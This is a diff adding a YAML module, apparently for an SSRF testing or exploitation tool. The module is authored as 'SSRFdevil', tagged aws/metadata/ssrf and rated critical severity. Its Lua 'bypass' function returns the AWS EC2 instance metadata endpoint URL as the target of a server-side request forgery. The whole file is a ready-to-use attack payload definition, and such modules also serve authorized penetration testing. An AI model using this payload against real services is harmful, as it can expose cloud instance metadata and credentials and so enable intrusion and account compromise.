@@ -1,0 +1,24 @@
+meta:
+  id: aws_metadata
+  version: 1
+  name: "AWS Metadata Endpoint"
+  description: "Access AWS EC2 metadata service"
+  author: "SSRFdevil"
+  created: "2026-06-19"
+  updated: "2026-06-19"
+  rank: 100
+  confidence: 95
+  severity: critical
+  tags: [aws, metadata, cloud, ssrf]
+  references: []
+match:
+  schemes: [http]
+  requires: [hostname]
+  supports: [cloud]
+script:
+  language: lua
+  entry: bypass
+  source: |
+    function bypass(ctx)
+      return { url = "http://169.254.169.254/latest/meta-data/" }
+    end
